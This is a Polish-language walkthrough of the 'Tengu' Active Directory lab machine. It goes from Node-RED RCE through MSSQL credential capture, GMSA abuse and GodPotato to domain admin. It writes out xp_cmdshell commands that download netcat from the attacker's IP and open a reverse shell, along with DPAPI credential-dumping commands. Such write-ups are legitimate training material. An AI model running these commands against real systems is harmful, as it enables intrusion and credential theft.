# Tengu
Windows,Medium, created by **r0BIT**

```

```


wszystkie znaki na ziemi i niebie wskazują na to, że zaczynamy od hosta `10.10.187.135` :D

![{6E9DB9D2-B72F-4E91-ADDE-0574BDDD7CDE}](https://github.com/user-attachments/assets/d9dbc373-1bc6-4bc7-9ef3-d3d2f2e2793f)

SZCZERZE nie używałem, ale nie wydaje się trudne.

![{F2319065-BD74-4ABB-9AB2-5D9851527316}](https://github.com/user-attachments/assets/b7733ee0-b9e4-45d5-93b0-e59928799455)

pierwsza informacja jaką mamy to, że mssql jest uruchominiony na jednym z dwóhc pozostałych hostów, ale nie mamy obecnie do tego dostępu/widoczności.

drugie co znalazłem `https://gist.github.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297`.

![{C5837A39-E08B-412F-A0F1-4BE6470D205F}](https://github.com/user-attachments/assets/0973e3c6-2301-4c74-b7b3-d9c3590861f0)

ciężko o prostsze rce xD

![{052F70E5-D269-4749-98F7-38C8F7A5ADAF}](https://github.com/user-attachments/assets/201830d6-2546-481f-bf21-9614bff99241)


aaa jednak nie do końca. Jakieś restrykcje są albo exploit słabo napisany. Po tym `Mär` widzę, że jakiś.. niemiecki linuch?
- coś mnie ten "shell" denerwuje to zrobię to po swojemu.

![{263628B0-CA75-4537-ABD6-747B1B7B2140}](https://github.com/user-attachments/assets/eec52ccc-d0c1-40c8-89d8-973966a68216)

![{E5B0AAA4-02B2-44ED-8917-3D4B0A3C5F2D}](https://github.com/user-attachments/assets/d5ac205f-26bd-440f-8034-0b01ce687200)

![{E27A760E-048E-4B75-81EA-3EAEAFB9B82D}](https://github.com/user-attachments/assets/305de14c-9cd0-4a97-9661-a5750227628a)

![{D2E3B0DB-5A0B-44F7-8B9B-9C8036D5736D}](https://github.com/user-attachments/assets/11fcc87d-d7b4-4536-bd6a-54dfdef75199)

teraz można prosto pivotować. `└─$ ssh nodered_svc@10.10.187.135 -i id_rsa -D 1080`

![{C2EBF56C-B66B-41E8-B092-7970BE1EEE28}](https://github.com/user-attachments/assets/8976d3ad-8f61-4443-853d-1a4599b9d819)

z jakiegoś powodu mamy tutaj dostęp, ale nic tu nie ma.

No to lecimy tam gdzie coś mamy.

![{C92B6A45-087E-4830-85FC-A13F7DE7D67A}](https://github.com/user-attachments/assets/7098c1c2-6f3e-4716-ad7c-c1386ed3af27)

w tym nazym poprzednim query widzimy credsy do mssql, ale ich nie odczytamy. 

![{55A74965-AA2D-4972-A911-5F84EB728233}](https://github.com/user-attachments/assets/f0ffcdb1-8f0e-448a-8b24-4f0df79af383)

zmieniamy IP na nasze. Deploy

![mssql](https://github.com/user-attachments/assets/c29eaff3-48cb-4878-8e8c-66a7091fc7ef)

i mamy credsy do mssqla :D
```
proxychains4 -q impacket-mssqlclient nodered_connector:<REDACTED>@10.10.187.134
```
(host drugi)

![{9214E3C7-1EA8-4F3F-8263-76038EB650E5}](https://github.com/user-attachments/assets/d65faa2d-9ca7-4d1a-aa3e-dc5c73b00369)

komend nie wykonamy.

![{CCE1EB47-A20F-4DF8-89EA-F293816ED90D}](https://github.com/user-attachments/assets/58d786c1-e7af-40ee-b933-d6113deb27ed)

![{807CA1C6-06C5-4EF2-8FD3-B42EA11043B9}](https://github.com/user-attachments/assets/87c687b0-024c-47d3-ac16-5d5998fccea7)

jakiś hash się trafił. User taki sam jak na linuxie.

![{61F84B29-CF6B-44AB-B89A-16A13AB262CF}](https://github.com/user-attachments/assets/f0a70ccd-ef7a-495f-bc57-e74a43884598)

proste hasło miał.

![{B9BD7E3B-5112-4EDA-8E65-F2B9DDCD6E1A}](https://github.com/user-attachments/assets/3da8e047-641f-4388-a8db-d833c9bda178)

tutaj pasuje.

![{B4ADEEEE-1604-401F-9E21-0A4BC6EFE61F}](https://github.com/user-attachments/assets/59998335-62c8-4ea2-8cb9-c16093fe340c)

tak szybka eskalacja to obstawiam coś z `/etc/krb5.keytab`

![{220A2E1C-4780-43D8-992B-ABAD0E70219A}](https://github.com/user-attachments/assets/4df9761a-8ba8-44d6-a54b-32c12a4cbd51)

- nie mam pojęcia co robić dalej więc trzeba po prostu wyliczać.

```
proxychains4 -q bloodhound-python -d tengu.vl -u t2_m.winters -p '<NOPE>' -c all -ns 10.10.187.133
```

![{27CD46B3-8C19-4027-9F27-54C60717D560}](https://github.com/user-attachments/assets/faf36887-0879-43be-bc80-d55c2bd2aa4f)

konto maszynowe jest Kerberoastable xD

![{AD53171E-1CD7-4B9F-8C4E-4916D33B6ABB}](https://github.com/user-attachments/assets/5da873d3-7adb-4d30-a6f6-a75174dcc376)

wygląda nieźle.

![{AC42EAD5-521C-4736-A10C-370548AFEA7A}](https://github.com/user-attachments/assets/0315111c-314c-4d47-aff7-fff92fa6c537)

o mamy pełny path. Czyli czytamy tylko GMSA i lecimy tym co wyżej.

![{BCFFFBF4-C2A5-471C-87E3-206313350DA2}](https://github.com/user-attachments/assets/10aa32bb-6b85-4687-ad1f-d0a0c9525656)

![{3F5AF9E7-7C62-42F6-94F5-FA39AD0BA700}](https://github.com/user-attachments/assets/ffb5bfa0-ba22-495c-894d-0c443a62c51e)

![{042F9585-4166-4D66-989B-FD89C1BC7A83}](https://github.com/user-attachments/assets/65a60a16-66cf-457b-aefd-78d2f01bc369)

![{E5B1B54C-1762-4BEE-9C87-10B104BDE7DB}](https://github.com/user-attachments/assets/26c22873-e75f-4961-af8d-5f34e1a71b2b)

![{E2478F4C-DA67-40F4-BA48-78CAD90EB2B6}](https://github.com/user-attachments/assets/7f0c4e80-89a1-46ac-978a-e0676666588d)

```
xp_cmdshell "powershell /c iwr 10.8.4.124/nc64.exe -o C:/Windows/Temp/nc64.exe"
xp_cmdshell "cmd /c C:/Windows/Temp/nc64.exe 10.8.4.124 9001 -e cmd.exe"
```

![{209C0E41-606D-40CF-AB20-718141C1541D}](https://github.com/user-attachments/assets/234bc969-9db9-4f55-8927-8fd2e1a10e58)

![{D81BADA7-528A-4EC8-854A-3125362C1B57}](https://github.com/user-attachments/assets/5cbc918e-4fd8-48b2-ba88-e4be9a5bff47)

GodPotato wchodzi. Zrobić revshella i mamy system.

![{F9B9328F-8FD6-483A-9E76-32F1C537EFFF}](https://github.com/user-attachments/assets/a342d19f-4806-44d5-ad41-847741e69a5a)

yeee

```
iwr 10.8.4.124/SharpDPAPI.exe -o SharpDPAPI.exe
SharpDPAPI.exe machinecredentials /showall
```

![{8FBA1FDB-EC03-49FC-85BA-A9E51C373E92}](https://github.com/user-attachments/assets/2d313526-18e8-494f-8b64-6338f5d87523)

o domain admin. Łatwo poszło

![da](https://github.com/user-attachments/assets/e22d33cd-9f60-40ab-bba7-5360a9bb0d9c)

![{803C48BC-E612-476E-8392-CD7780C8BE0B}](https://github.com/user-attachments/assets/68797e8d-6b86-44e5-9fce-e0ff77d1032f)


### mi nie działa

```
cat /etc/krb5.conf                               
[libdefaults]
        default_realm = TENGU.VL
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false
        dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]
        TENGU.VL = {
                kdc = dc.tengu.vl
        }

[domain_realm]
        .tengu.vl = TENGU.VL
```

![{AA4B3826-D0F7-436F-8197-80E76E7DFFF4}](https://github.com/user-attachments/assets/9db9698a-ddc1-4ece-9f76-2d8c2a350948)


FINISH


